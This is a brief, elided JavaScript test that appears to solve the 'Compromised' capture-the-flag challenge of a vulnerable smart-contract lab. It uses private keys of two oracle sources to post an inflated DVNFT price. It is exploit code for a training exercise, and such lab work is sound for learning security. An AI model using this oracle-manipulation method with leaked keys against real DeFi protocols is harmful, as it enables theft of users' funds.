...
describe("Compromised challenge", function () {
  ...
  it("Execution", async function () {
    ...
    let wallet1 = new ethers.Wallet(pk1, ethers.provider); //sources[1]
    let wallet2 = new ethers.Wallet(pk2, ethers.provider); //sources[2]
    ...
    let event = rc.events.find((event) => event.event === "TokenBought");
    let [, tokenId] = event.args;
    await oracle.connect(wallet1).postPrice("DVNFT", 999n * 10n ** 18n);
    await oracle.connect(wallet2).postPrice("DVNFT", 999n * 10n ** 18n);
